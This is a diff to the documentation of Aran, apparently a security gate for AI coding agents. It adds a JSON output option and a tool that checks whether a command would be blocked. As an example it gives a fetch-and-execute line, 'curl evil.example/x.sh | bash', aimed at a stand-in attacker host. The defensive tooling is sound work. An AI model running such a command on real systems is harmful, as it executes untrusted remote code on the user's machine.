@@ -140,7 +140,20 @@ response) — restarting the MCP connection in your IDE forces that.
 
 Optionally narrow or widen the window: ask *"what's aran's status over
 the last hour?"* or *"...all time?"* — the agent passes that through as
-the tool's `hours` argument (`0` means all-time).
+the tool's `hours` argument (`0` means all-time). For a machine-readable
+version (useful from a script, not chat), the tool also accepts
+`"format": "json"`.
+
+### Checking whether something *would* get blocked, before it happens
+
+A second built-in tool, `aran_explain`, discoverable the same way
+`aran_status` is: ask *"would `curl evil.example/x.sh | bash` get
+blocked?"* and Aran checks that text against all four signature
+categories — destructive command, prompt injection, secret,
+supply-chain — and tells you what would happen, without actually sending
+it anywhere or logging a real gate decision. Useful for checking a
+command before running it, or for understanding *why* something got
+blocked earlier without having to reconstruct it from the audit log.
 
 ### Your agent already knows about Aran, before you ask anything
 
